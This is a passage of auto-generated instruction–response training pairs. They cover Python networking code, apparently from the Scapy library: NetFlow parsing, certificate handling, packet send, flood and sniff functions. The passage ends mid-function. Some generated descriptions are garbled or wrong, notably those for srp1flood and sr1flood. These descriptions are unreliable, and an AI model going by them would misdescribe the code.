{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd a field to the internal buffer.", "response": "def addfield(self, pkt, s, i):\n        \"\"\"\n        There is a hack with the _ExtensionsField.i2len. It works only because\n        we expect _ExtensionsField.i2m to return a string of the same size (if\n        not of the same value) upon successive calls (e.g. through i2len here,\n        then i2m when directly building the _ExtensionsField).\n\n        XXX A proper way to do this would be to keep the extensions built from\n        the i2len call here, instead of rebuilding them later on.\n        \"\"\"\n        if i is None:\n            if self.length_of is not None:\n                fld, fval = pkt.getfield_and_val(self.length_of)\n\n                tmp = pkt.tls_session.frozen\n                pkt.tls_session.frozen = True\n                f = fld.i2len(pkt, fval)\n                pkt.tls_session.frozen = tmp\n\n                i = self.adjust(pkt, f)\n                if i == 0:  # for correct build if no ext and not explicitly 0\n                    return s\n        return s + struct.pack(self.fmt, i)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _GenNetflowRecordV9(cls, lengths_list):\n    _fields_desc = []\n    for j, k in lengths_list:\n        _f_data = NetflowV9TemplateFieldDecoders.get(k, None)\n        _f_type, _f_args = (\n            _f_data if isinstance(_f_data, tuple) else (_f_data, [])\n        )\n        _f_kwargs = {}\n        if _f_type:\n            if issubclass(_f_type, _AdjustableNetflowField):\n                _f_kwargs[\"length\"] = j\n            _fields_desc.append(\n                _f_type(\n                    NetflowV910TemplateFieldTypes.get(k, \"unknown_data\"),\n                    0, *_f_args, **_f_kwargs\n                )\n            )\n        else:\n            _fields_desc.append(\n                _CustomStrFixedLenField(\n                    NetflowV910TemplateFieldTypes.get(k, \"unknown_data\"),\n                    b\"\", length=j\n                )\n            )\n\n    # This will act exactly like a NetflowRecordV9, but has custom fields\n    class NetflowRecordV9I(cls):\n        fields_desc = _fields_desc\n        match_subclass = True\n    NetflowRecordV9I.name = cls.name\n    NetflowRecordV9I.__name__ = cls.__name__\n    return NetflowRecordV9I", "response": "Internal function used to generate the Records from the given class and the given list of lengths."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nuse internally to process a single packet during defragmenting.", "response": "def _netflowv9_defragment_packet(pkt, definitions, definitions_opts, ignored):\n    \"\"\"Used internally to process a single packet during defragmenting\"\"\"\n    # Dataflowset definitions\n    if NetflowFlowsetV9 in pkt:\n        current = pkt\n        while NetflowFlowsetV9 in current:\n            current = current[NetflowFlowsetV9]\n            for ntv9 in current.templates:\n                llist = []\n                for tmpl in ntv9.template_fields:\n                    llist.append((tmpl.fieldLength, tmpl.fieldType))\n                if llist:\n                    tot_len = sum(x[0] for x in llist)\n                    cls = _GenNetflowRecordV9(NetflowRecordV9, llist)\n                    definitions[ntv9.templateID] = (tot_len, cls)\n            current = current.payload\n    # Options definitions\n    if NetflowOptionsFlowsetV9 in pkt:\n        current = pkt\n        while NetflowOptionsFlowsetV9 in current:\n            current = current[NetflowOptionsFlowsetV9]\n            # Load scopes\n            llist = []\n            for scope in current.scopes:\n                llist.append((\n                    scope.scopeFieldlength,\n                    scope.scopeFieldType\n                ))\n            scope_tot_len = sum(x[0] for x in llist)\n            scope_cls = _GenNetflowRecordV9(\n                NetflowOptionsRecordScopeV9,\n                llist\n            )\n            # Load options\n            llist = []\n            for opt in current.options:\n                llist.append((\n                    opt.optionFieldlength,\n                    opt.optionFieldType\n                ))\n            option_tot_len = sum(x[0] for x in llist)\n            option_cls = _GenNetflowRecordV9(\n                NetflowOptionsRecordOptionV9,\n                llist\n            )\n            # Storage\n            definitions_opts[current.templateID] = (\n                scope_tot_len, scope_cls,\n                option_tot_len, option_cls\n            )\n            current = current.payload\n    # Dissect flowsets\n    if NetflowDataflowsetV9 in pkt:\n        datafl = pkt[NetflowDataflowsetV9]\n        tid = datafl.templateID\n        if tid not in definitions and tid not in definitions_opts:\n            ignored.add(tid)\n            return\n        # All data is stored in one record, awaiting to be split\n        # If fieldValue is available, the record has not been\n        # defragmented: pop it\n        try:\n            data = datafl.records[0].fieldValue\n            datafl.records.pop(0)\n        except (IndexError, AttributeError):\n            return\n        res = []\n        # Flowset record\n        # Now, according to the flow/option data,\n        # let's re-dissect NetflowDataflowsetV9\n        if tid in definitions:\n            tot_len, cls = definitions[tid]\n            while len(data) >= tot_len:\n                res.append(cls(data[:tot_len]))\n                data = data[tot_len:]\n            # Inject dissected data\n            datafl.records = res\n            datafl.do_dissect_payload(data)\n        # Options\n        elif tid in definitions_opts:\n            (scope_len, scope_cls,\n                option_len, option_cls) = definitions_opts[tid]\n            # Dissect scopes\n            if scope_len:\n                res.append(scope_cls(data[:scope_len]))\n            if option_len:\n                res.append(\n                    option_cls(data[scope_len:scope_len + option_len])\n                )\n            if len(data) > scope_len + option_len:\n                res.append(\n                    conf.padding_layer(data[scope_len + option_len:])\n                )\n            # Inject dissected data\n            datafl.records = res\n            datafl.name = \"Netflow DataFlowSet V9/10 - OPTIONS\""}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprocess all NetflowV9 and NetflowOptionsFlowsetV9 packets to match IDs of the Headers of the DataFlowsets with the Headers of the DataFlowsets .", "response": "def netflowv9_defragment(plist, verb=1):\n    \"\"\"Process all NetflowV9/10 Packets to match IDs of the DataFlowsets\n    with the Headers\n\n    params:\n     - plist: the list of mixed NetflowV9/10 packets.\n     - verb: verbose print (0/1)\n    \"\"\"\n    if not isinstance(plist, (PacketList, list)):\n        plist = [plist]\n    # We need the whole packet to be dissected to access field def in\n    # NetflowFlowsetV9 or NetflowOptionsFlowsetV9/10\n    definitions = {}\n    definitions_opts = {}\n    ignored = set()\n    # Iterate through initial list\n    for pkt in plist:\n        _netflowv9_defragment_packet(pkt,\n                                     definitions,\n                                     definitions_opts,\n                                     ignored)\n    if conf.verb >= 1 and ignored:\n        warning(\"Ignored templateIDs (missing): %s\" % list(ignored))\n    return plist"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconverting a DER octet string to PEM format.", "response": "def der2pem(der_string, obj=\"UNKNOWN\"):\n    \"\"\"Convert DER octet string to PEM format (with optional header)\"\"\"\n    # Encode a byte string in PEM format. Header advertizes <obj> type.\n    pem_string = (\"-----BEGIN %s-----\\n\" % obj).encode()\n    base64_string = base64.b64encode(der_string)\n    chunks = [base64_string[i:i + 64] for i in range(0, len(base64_string), 64)]  # noqa: E501\n    pem_string += b'\\n'.join(chunks)\n    pem_string += (\"\\n-----END %s-----\\n\" % obj).encode()\n    return pem_string"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts PEM string to DER format", "response": "def pem2der(pem_string):\n    \"\"\"Convert PEM string to DER format\"\"\"\n    # Encode all lines between the first '-----\\n' and the 2nd-to-last '-----'.\n    pem_string = pem_string.replace(b\"\\r\", b\"\")\n    first_idx = pem_string.find(b\"-----\\n\") + 6\n    if pem_string.find(b\"-----BEGIN\", first_idx) != -1:\n        raise Exception(\"pem2der() expects only one PEM-encoded object\")\n    last_idx = pem_string.rfind(b\"-----\", 0, pem_string.rfind(b\"-----\"))\n    base64_string = pem_string[first_idx:last_idx]\n    base64_string.replace(b\"\\n\", b\"\")\n    der_string = base64.b64decode(base64_string)\n    return der_string"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef split_pem(s):\n    pem_strings = []\n    while s != b\"\":\n        start_idx = s.find(b\"-----BEGIN\")\n        if start_idx == -1:\n            break\n        end_idx = s.find(b\"-----END\")\n        end_idx = s.find(b\"\\n\", end_idx) + 1\n        pem_strings.append(s[start_idx:end_idx])\n        s = s[end_idx:]\n    return pem_strings", "response": "Split PEM objects. Useful to process concatenated certificates."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a CAfile from the list of anchor_list and write the result to filename.", "response": "def _create_ca_file(anchor_list, filename):\n    \"\"\"\n    Concatenate all the certificates (PEM format for the export) in\n    'anchor_list' and write the result to file 'filename'. On success\n    'filename' is returned, None otherwise.\n\n    If you are used to OpenSSL tools, this function builds a CAfile\n    that can be used for certificate and CRL check.\n    \"\"\"\n    try:\n        with open(filename, \"w\") as f:\n            for a in anchor_list:\n                s = a.output(fmt=\"PEM\")\n                f.write(s)\n    except IOError:\n        return None\n    return filename"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef verifyCert(self, cert):\n        tbsCert = cert.tbsCertificate\n        sigAlg = tbsCert.signature\n        h = hash_by_oid[sigAlg.algorithm.val]\n        sigVal = raw(cert.signatureValue)\n        return self.verify(raw(tbsCert), sigVal, h=h, t='pkcs')", "response": "Verifies either a Cert or X509_Cert."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef signTBSCert(self, tbsCert, h=\"sha256\"):\n        sigAlg = tbsCert.signature\n        h = h or hash_by_oid[sigAlg.algorithm.val]\n        sigVal = self.sign(raw(tbsCert), h=h, t='pkcs')\n        c = X509_Cert()\n        c.tbsCertificate = tbsCert\n        c.signatureAlgorithm = sigAlg\n        c.signatureValue = _Raw_ASN1_BIT_STRING(sigVal, readable=True)\n        return c", "response": "Signs a TBSCert and returns a X509_Cert object with the signature field set to the signatureValue of the TBSCert."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn True if the certificate is self - signed.", "response": "def isSelfSigned(self):\n        \"\"\"\n        Return True if the certificate is self-signed:\n          - issuer and subject are the same\n          - the signature of the certificate is valid.\n        \"\"\"\n        if self.issuer_hash == self.subject_hash:\n            return self.isIssuerCert(self)\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef isRevoked(self, crl_list):\n        for c in crl_list:\n            if (self.authorityKeyID is not None and\n                c.authorityKeyID is not None and\n                    self.authorityKeyID == c.authorityKeyID):\n                return self.serial in (x[0] for x in c.revoked_cert_serials)\n            elif self.issuer == c.issuer:\n                return self.serial in (x[0] for x in c.revoked_cert_serials)\n        return False", "response": "This function returns True if the certificate is marked as revoked by one of the trusted CRLs in crl_list."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nexporting certificate in fmt format to file filename", "response": "def export(self, filename, fmt=\"DER\"):\n        \"\"\"\n        Export certificate in 'fmt' format (DER or PEM) to file 'filename'\n        \"\"\"\n        f = open(filename, \"wb\")\n        if fmt == \"DER\":\n            f.write(self.der)\n        elif fmt == \"PEM\":\n            f.write(self.pem)\n        f.close()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nverifying the chain for this certificate.", "response": "def verifyChain(self, anchors, untrusted=None):\n        \"\"\"\n        Perform verification of certificate chains for that certificate.\n        A list of anchors is required. The certificates in the optional\n        untrusted list may be used as additional elements to the final chain.\n        On par with chain instantiation, only one chain constructed with the\n        untrusted candidates will be retained. Eventually, dates are checked.\n        \"\"\"\n        untrusted = untrusted or []\n        for a in anchors:\n            chain = Chain(self + untrusted, a)\n            if len(chain) == 1:             # anchor only\n                continue\n            # check that the chain does not exclusively rely on untrusted\n            if any(c in chain[1:] for c in self):\n                for c in chain:\n                    if c.remainingDays() < 0:\n                        break\n                if c is chain[-1]:      # we got to the end of the chain\n                    return chain\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nverifying the certificates in the cafile and return a list of anchors and untrusted certificates.", "response": "def verifyChainFromCAFile(self, cafile, untrusted_file=None):\n        \"\"\"\n        Does the same job as .verifyChain() but using the list of anchors\n        from the cafile. As for .verifyChain(), a list of untrusted\n        certificates can be passed (as a file, this time).\n        \"\"\"\n        try:\n            f = open(cafile, \"rb\")\n            ca_certs = f.read()\n            f.close()\n        except Exception:\n            raise Exception(\"Could not read from cafile\")\n\n        anchors = [Cert(c) for c in split_pem(ca_certs)]\n\n        untrusted = None\n        if untrusted_file:\n            try:\n                f = open(untrusted_file, \"rb\")\n                untrusted_certs = f.read()\n                f.close()\n            except Exception:\n                raise Exception(\"Could not read from untrusted_file\")\n            untrusted = [Cert(c) for c in split_pem(untrusted_certs)]\n\n        return self.verifyChain(anchors, untrusted)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef verifyChainFromCAPath(self, capath, untrusted_file=None):\n        try:\n            anchors = []\n            for cafile in os.listdir(capath):\n                anchors.append(Cert(open(os.path.join(capath, cafile), \"rb\").read()))  # noqa: E501\n        except Exception:\n            raise Exception(\"capath provided is not a valid cert path\")\n\n        untrusted = None\n        if untrusted_file:\n            try:\n                f = open(untrusted_file, \"rb\")\n                untrusted_certs = f.read()\n                f.close()\n            except Exception:\n                raise Exception(\"Could not read from untrusted_file\")\n            untrusted = [Cert(c) for c in split_pem(untrusted_certs)]\n\n        return self.verifyChain(anchors, untrusted)", "response": "Verify the chain of certificates in a directory."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef answers(self, other):\n        if other.__class__ == self.__class__:\n            return (other.service + 0x40) == self.service or \\\n                   (self.service == 0x7f and\n                    self.request_service_id == other.service)\n        return False", "response": "Returns True if self is an answer from other."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _sndrcv_snd(pks, timeout, inter, verbose, tobesent, hsent, timessent, stopevent):  # noqa: E501\n    try:\n        i = 0\n        rec_time = timessent is not None\n        if verbose:\n            print(\"Begin emission:\")\n        for p in tobesent:\n            # Populate the dictionary of _sndrcv_rcv\n            # _sndrcv_rcv won't miss the answer of a packet that has not been sent  # noqa: E501\n            hsent.setdefault(p.hashret(), []).append(p)\n            if stopevent.is_set():\n                break\n            # Send packet\n            pks.send(p)\n            if rec_time:\n                timessent[i] = p.sent_time\n            i += 1\n            time.sleep(inter)\n        if verbose:\n            print(\"Finished sending %i packets.\" % i)\n    except SystemExit:\n        pass\n    except KeyboardInterrupt:\n        pass\n    except Exception:\n        log_runtime.exception(\"--- Error sending packets\")\n    if timeout is not None:\n        def _timeout(stopevent):\n            stopevent.wait(timeout)\n            stopevent.set()\n        thread = threading.Thread(\n            target=_timeout, args=(stopevent,)\n        )\n        thread.setDaemon(True)\n        thread.start()", "response": "Function used in the sending thread of sndrcv"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _sndrcv_rcv(pks, hsent, stopevent, nbrecv, notans, verbose, chainCC,\n                multi, _storage_policy=None):\n    \"\"\"Function used to receive packets and check their hashret\"\"\"\n    if not _storage_policy:\n        _storage_policy = lambda x, y: (x, y)\n    ans = []\n\n    def _get_pkt():\n        # SuperSocket.select() returns, according to each socket type,\n        # the selected sockets + the function to recv() the packets (or None)\n        # (when sockets aren't selectable, should be nonblock_recv)\n        selected, read_func = pks.select([pks])\n        read_func = read_func or pks.__class__.recv\n        if selected:\n            return read_func(selected[0])\n\n    try:\n        while True:\n            r = _get_pkt()\n            if stopevent.is_set():\n                break\n            if r is None:\n                continue\n            ok = False\n            h = r.hashret()\n            if h in hsent:\n                hlst = hsent[h]\n                for i, sentpkt in enumerate(hlst):\n                    if r.answers(sentpkt):\n                        ans.append(_storage_policy(sentpkt, r))\n                        if verbose > 1:\n                            os.write(1, b\"*\")\n                        ok = True\n                        if not multi:\n                            del hlst[i]\n                            notans -= 1\n                        else:\n                            if not hasattr(sentpkt, '_answered'):\n                                notans -= 1\n                            sentpkt._answered = 1\n                        break\n            if notans == 0 and not multi:\n                del r\n                break\n            if not ok:\n                if verbose > 1:\n                    os.write(1, b\".\")\n                nbrecv += 1\n                if conf.debug_match:\n                    debug.recv.append(r)\n            del r\n    except KeyboardInterrupt:\n        if chainCC:\n            raise\n    finally:\n        stopevent.set()\n    return (hsent, ans, nbrecv, notans)", "response": "Function used to receive packets and check their hashret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef send(x, inter=0, loop=0, count=None,\n         verbose=None, realtime=None,\n         return_packets=False, socket=None, *args, **kargs):\n    \"\"\"Send packets at layer 3\nsend(packets, [inter=0], [loop=0], [count=None], [verbose=conf.verb], [realtime=None], [return_packets=False],  # noqa: E501\n     [socket=None]) -> None\"\"\"\n    need_closing = socket is None\n    socket = socket or conf.L3socket(*args, **kargs)\n    results = __gen_send(socket, x, inter=inter, loop=loop,\n                         count=count, verbose=verbose,\n                         realtime=realtime, return_packets=return_packets)\n    if need_closing:\n        socket.close()\n    return results", "response": "Send a packet at layer 3."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsending packets at layer 2.", "response": "def sendp(x, inter=0, loop=0, iface=None, iface_hint=None, count=None,\n          verbose=None, realtime=None,\n          return_packets=False, socket=None, *args, **kargs):\n    \"\"\"Send packets at layer 2\nsendp(packets, [inter=0], [loop=0], [iface=None], [iface_hint=None], [count=None], [verbose=conf.verb],  # noqa: E501\n      [realtime=None], [return_packets=False], [socket=None]) -> None\"\"\"\n    if iface is None and iface_hint is not None and socket is None:\n        iface = conf.route.route(iface_hint)[0]\n    need_closing = socket is None\n    socket = socket or conf.L2socket(iface=iface, *args, **kargs)\n    results = __gen_send(socket, x, inter=inter, loop=loop,\n                         count=count, verbose=verbose,\n                         realtime=realtime, return_packets=return_packets)\n    if need_closing:\n        socket.close()\n    return results"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsend packets at layer 2 using tcpreplay for performance", "response": "def sendpfast(x, pps=None, mbps=None, realtime=None, loop=0, file_cache=False, iface=None, replay_args=None,  # noqa: E501\n              parse_results=False):\n    \"\"\"Send packets at layer 2 using tcpreplay for performance\n    pps:  packets per second\n    mpbs: MBits per second\n    realtime: use packet's timestamp, bending time with real-time value\n    loop: number of times to process the packet list\n    file_cache: cache packets in RAM instead of reading from disk at each iteration  # noqa: E501\n    iface: output interface\n    replay_args: List of additional tcpreplay args (List[str])\n    parse_results: Return a dictionary of information outputted by tcpreplay (default=False)  # noqa: E501\n    :returns stdout, stderr, command used\"\"\"\n    if iface is None:\n        iface = conf.iface\n    argv = [conf.prog.tcpreplay, \"--intf1=%s\" % iface]\n    if pps is not None:\n        argv.append(\"--pps=%i\" % pps)\n    elif mbps is not None:\n        argv.append(\"--mbps=%f\" % mbps)\n    elif realtime is not None:\n        argv.append(\"--multiplier=%f\" % realtime)\n    else:\n        argv.append(\"--topspeed\")\n\n    if loop:\n        argv.append(\"--loop=%i\" % loop)\n    if file_cache:\n        argv.append(\"--preload-pcap\")\n\n    # Check for any additional args we didn't cover.\n    if replay_args is not None:\n        argv.extend(replay_args)\n\n    f = get_temp_file()\n    argv.append(f)\n    wrpcap(f, x)\n    results = None\n    with ContextManagerSubprocess(\"sendpfast()\", conf.prog.tcpreplay):\n        try:\n            cmd = subprocess.Popen(argv, stdout=subprocess.PIPE,\n                                   stderr=subprocess.PIPE)\n        except KeyboardInterrupt:\n            log_interactive.info(\"Interrupted by user\")\n        except Exception:\n            os.unlink(f)\n            raise\n        else:\n            stdout, stderr = cmd.communicate()\n            if stderr:\n                log_runtime.warning(stderr.decode())\n            if parse_results:\n                results = _parse_tcpreplay_result(stdout, stderr, argv)\n            elif conf.verb > 2:\n                log_runtime.info(stdout.decode())\n    os.unlink(f)\n    return results"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nparse the output of tcpreplay and modify the results_dict to populate the output information.", "response": "def _parse_tcpreplay_result(stdout, stderr, argv):\n    \"\"\"\n    Parse the output of tcpreplay and modify the results_dict to populate output information.  # noqa: E501\n    Tested with tcpreplay v3.4.4\n    Tested with tcpreplay v4.1.2\n    :param stdout: stdout of tcpreplay subprocess call\n    :param stderr: stderr of tcpreplay subprocess call\n    :param argv: the command used in the subprocess call\n    :return: dictionary containing the results\n    \"\"\"\n    try:\n        results = {}\n        stdout = plain_str(stdout).lower()\n        stderr = plain_str(stderr).strip().split(\"\\n\")\n        elements = {\n            \"actual\": (int, int, float),\n            \"rated\": (float, float, float),\n            \"flows\": (int, float, int, int),\n            \"attempted\": (int,),\n            \"successful\": (int,),\n            \"failed\": (int,),\n            \"truncated\": (int,),\n            \"retried packets (eno\": (int,),\n            \"retried packets (eag\": (int,),\n        }\n        multi = {\n            \"actual\": (\"packets\", \"bytes\", \"time\"),\n            \"rated\": (\"bps\", \"mbps\", \"pps\"),\n            \"flows\": (\"flows\", \"fps\", \"flow_packets\", \"non_flow\"),\n            \"retried packets (eno\": (\"retried_enobufs\",),\n            \"retried packets (eag\": (\"retried_eagain\",),\n        }\n        float_reg = r\"([0-9]*\\.[0-9]+|[0-9]+)\"\n        int_reg = r\"([0-9]+)\"\n        any_reg = r\"[^0-9]*\"\n        r_types = {int: int_reg, float: float_reg}\n        for line in stdout.split(\"\\n\"):\n            line = line.strip()\n            for elt, _types in elements.items():\n                if line.startswith(elt):\n                    regex = any_reg.join([r_types[x] for x in _types])\n                    matches = re.search(regex, line)\n                    for i, typ in enumerate(_types):\n                        name = multi.get(elt, [elt])[i]\n                        results[name] = typ(matches.group(i + 1))\n        results[\"command\"] = \" \".join(argv)\n        results[\"warnings\"] = stderr[:-1]\n        return results\n    except Exception as parse_exception:\n        if not conf.interactive:\n            raise\n        log_runtime.error(\"Error parsing output: \" + str(parse_exception))\n        return {}"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef sr(x, promisc=None, filter=None, iface=None, nofilter=0, *args, **kargs):\n    s = conf.L3socket(promisc=promisc, filter=filter,\n                      iface=iface, nofilter=nofilter)\n    result = sndrcv(s, x, *args, **kargs)\n    s.close()\n    return result", "response": "Send and receive packets at layer 3"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsend packets at layer 3 and return only the first answer", "response": "def sr1(x, promisc=None, filter=None, iface=None, nofilter=0, *args, **kargs):\n    \"\"\"Send packets at layer 3 and return only the first answer\"\"\"\n    s = conf.L3socket(promisc=promisc, filter=filter,\n                      nofilter=nofilter, iface=iface)\n    ans, _ = sndrcv(s, x, *args, **kargs)\n    s.close()\n    if len(ans) > 0:\n        return ans[0][1]\n    else:\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef srp(x, promisc=None, iface=None, iface_hint=None, filter=None,\n        nofilter=0, type=ETH_P_ALL, *args, **kargs):\n    \"\"\"Send and receive packets at layer 2\"\"\"\n    if iface is None and iface_hint is not None:\n        iface = conf.route.route(iface_hint)[0]\n    s = conf.L2socket(promisc=promisc, iface=iface,\n                      filter=filter, nofilter=nofilter, type=type)\n    result = sndrcv(s, x, *args, **kargs)\n    s.close()\n    return result", "response": "Send and receive packets at layer 2"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsend and receive packets at layer 2 and return only the first answer", "response": "def srp1(*args, **kargs):\n    \"\"\"Send and receive packets at layer 2 and return only the first answer\"\"\"\n    ans, _ = srp(*args, **kargs)\n    if len(ans) > 0:\n        return ans[0][1]\n    else:\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nflood and receive packets at layer 3 prn", "response": "def srflood(x, promisc=None, filter=None, iface=None, nofilter=None, *args, **kargs):  # noqa: E501\n    \"\"\"Flood and receive packets at layer 3\nprn:      function applied to packets received\nunique:   only consider packets whose print\nnofilter: put 1 to avoid use of BPF filters\nfilter:   provide a BPF filter\niface:    listen answers only on the given interface\"\"\"\n    s = conf.L3socket(promisc=promisc, filter=filter, iface=iface, nofilter=nofilter)  # noqa: E501\n    r = sndrcvflood(s, x, *args, **kargs)\n    s.close()\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef sr1flood(x, promisc=None, filter=None, iface=None, nofilter=0, *args, **kargs):  # noqa: E501\n    s = conf.L3socket(promisc=promisc, filter=filter, nofilter=nofilter, iface=iface)  # noqa: E501\n    ans, _ = sndrcvflood(s, x, *args, **kargs)\n    s.close()\n    if len(ans) > 0:\n        return ans[0][1]\n    else:\n        return None", "response": "Flood and receive packets at layer 3 and return only the first answer\nprn :      function applied to packets received\nnverbose : put 1 to avoid use of BPF filter\niface : give a BPF interface"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef srpflood(x, promisc=None, filter=None, iface=None, iface_hint=None, nofilter=None, *args, **kargs):  # noqa: E501\n    if iface is None and iface_hint is not None:\n        iface = conf.route.route(iface_hint)[0]\n    s = conf.L2socket(promisc=promisc, filter=filter, iface=iface, nofilter=nofilter)  # noqa: E501\n    r = sndrcvflood(s, x, *args, **kargs)\n    s.close()\n    return r", "response": "Flood and receive packets at layer 2\nprn"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nflooding and receive packets at layer 2 and return only the first answer prn : function applied to packets received nverbose levelofilter nofilter iface provide a BPF filter iface provide a BPF filter iface provide a BPF filter iface provide a BPF iface", "response": "def srp1flood(x, promisc=None, filter=None, iface=None, nofilter=0, *args, **kargs):  # noqa: E501\n    \"\"\"Flood and receive packets at layer 2 and return only the first answer\nprn:      function applied to packets received\nverbose:  set verbosity level\nnofilter: put 1 to avoid use of BPF filters\nfilter:   provide a BPF filter\niface:    listen answers only on the given interface\"\"\"\n    s = conf.L2socket(promisc=promisc, filter=filter, nofilter=nofilter, iface=iface)  # noqa: E501\n    ans, _ = sndrcvflood(s, x, *args, **kargs)\n    s.close()\n    if len(ans) > 0:\n        return ans[0][1]\n    else:\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef sniff(count=0, store=True, offline=None, prn=None, lfilter=None,\n          L2socket=None, timeout=None, opened_socket=None,\n          stop_filter=None, iface=None, started_callback=None,\n          session=None, *arg, **karg):\n    \"\"\"Sniff packets and return a list of packets.\n\n    Args:\n        count: number of packets to capture. 0 means infinity.\n        store: whether to store sniffed packets or discard them\n        prn: function to apply to each packet. If something is returned, it\n             is displayed.\n             --Ex: prn = lambda x: x.summary()\n        session: a session = a flow decoder used to handle stream of packets.\n                 e.g: IPSession (to defragment on-the-flow) or NetflowSession\n        filter: BPF filter to apply.\n        lfilter: Python function applied to each packet to determine if\n                 further action may be done.\n                 --Ex: lfilter = lambda x: x.haslayer(Padding)\n        offline: PCAP file (or list of PCAP files) to read packets from,\n                 instead of sniffing them\n        timeout: stop sniffing after a given time (default: None).\n        L2socket: use the provided L2socket (default: use conf.L2listen).\n        opened_socket: provide an object (or a list of objects) ready to use\n                      .recv() on.\n        stop_filter: Python function applied to each packet to determine if\n                     we have to stop the capture after this packet.\n                     --Ex: stop_filter = lambda x: x.haslayer(TCP)\n        iface: interface or list of interfaces (default: None for sniffing\n               on all interfaces).\n        monitor: use monitor mode. May not be available on all OS\n        started_callback: called as soon as the sniffer starts sniffing\n                          (default: None).\n\n    The iface, offline and opened_socket parameters can be either an\n    element, a list of elements, or a dict object mapping an element to a\n    label (see examples below).\n\n    Examples:\n      >>> sniff(filter=\"arp\")\n      >>> sniff(filter=\"tcp\",\n      ...       session=IPSession,  # defragment on-the-flow\n      ...       prn=lambda x: x.summary())\n      >>> sniff(lfilter=lambda pkt: ARP in pkt)\n      >>> sniff(iface=\"eth0\", prn=Packet.summary)\n      >>> sniff(iface=[\"eth0\", \"mon0\"],\n      ...       prn=lambda pkt: \"%s: %s\" % (pkt.sniffed_on,\n      ...                                   pkt.summary()))\n      >>> sniff(iface={\"eth0\": \"Ethernet\", \"mon0\": \"Wifi\"},\n      ...       prn=lambda pkt: \"%s: %s\" % (pkt.sniffed_on,\n      ...                                   pkt.summary()))\n    \"\"\"\n    c = 0\n    session = session or DefaultSession\n    session = session(prn, store)  # instantiate session\n    sniff_sockets = {}  # socket: label dict\n    if opened_socket is not None:\n        if isinstance(opened_socket, list):\n            sniff_sockets.update((s, \"socket%d\" % i)\n                                 for i, s in enumerate(opened_socket))\n        elif isinstance(opened_socket, dict):\n            sniff_sockets.update((s, label)\n                                 for s, label in six.iteritems(opened_socket))\n        else:\n            sniff_sockets[opened_socket] = \"socket0\"\n    if offline is not None:\n        flt = karg.get('filter')\n        if isinstance(offline, list):\n            sniff_sockets.update((PcapReader(\n                fname if flt is None else\n                tcpdump(fname, args=[\"-w\", \"-\", flt], getfd=True)\n            ), fname) for fname in offline)\n        elif isinstance(offline, dict):\n            sniff_sockets.update((PcapReader(\n                fname if flt is None else\n                tcpdump(fname, args=[\"-w\", \"-\", flt], getfd=True)\n            ), label) for fname, label in six.iteritems(offline))\n        else:\n            sniff_sockets[PcapReader(\n                offline if flt is None else\n                tcpdump(offline, args=[\"-w\", \"-\", flt], getfd=True)\n            )] = offline\n    if not sniff_sockets or iface is not None:\n        if L2socket is None:\n            L2socket = conf.L2listen\n        if isinstance(iface, list):\n            sniff_sockets.update(\n                (L2socket(type=ETH_P_ALL, iface=ifname, *arg, **karg), ifname)\n                for ifname in iface\n            )\n        elif isinstance(iface, dict):\n            sniff_sockets.update(\n                (L2socket(type=ETH_P_ALL, iface=ifname, *arg, **karg), iflabel)\n                for ifname, iflabel in six.iteritems(iface)\n            )\n        else:\n            sniff_sockets[L2socket(type=ETH_P_ALL, iface=iface,\n                                   *arg, **karg)] = iface\n    if timeout is not None:\n        stoptime = time.time() + timeout\n    remain = None\n\n    # Get select information from the sockets\n    _main_socket = next(iter(sniff_sockets))\n    read_allowed_exceptions = _main_socket.read_allowed_exceptions\n    select_func = _main_socket.select\n    # We check that all sockets use the same select(), or raise a warning\n    if not all(select_func == sock.select for sock in sniff_sockets):\n        warning(\"Warning: inconsistent socket types ! The used select function\"\n                \"will be the one of the first socket\")\n    # Now let's build the select function, used later on\n    _select = lambda sockets, remain: select_func(sockets, remain)[0]\n\n    try:\n        if started_callback:\n            started_callback()\n        continue_sniff = True\n        while sniff_sockets and continue_sniff:\n            if timeout is not None:\n                remain = stoptime - time.time()\n                if remain <= 0:\n                    break\n            for s in _select(sniff_sockets, remain):\n                try:\n                    p = s.recv()\n                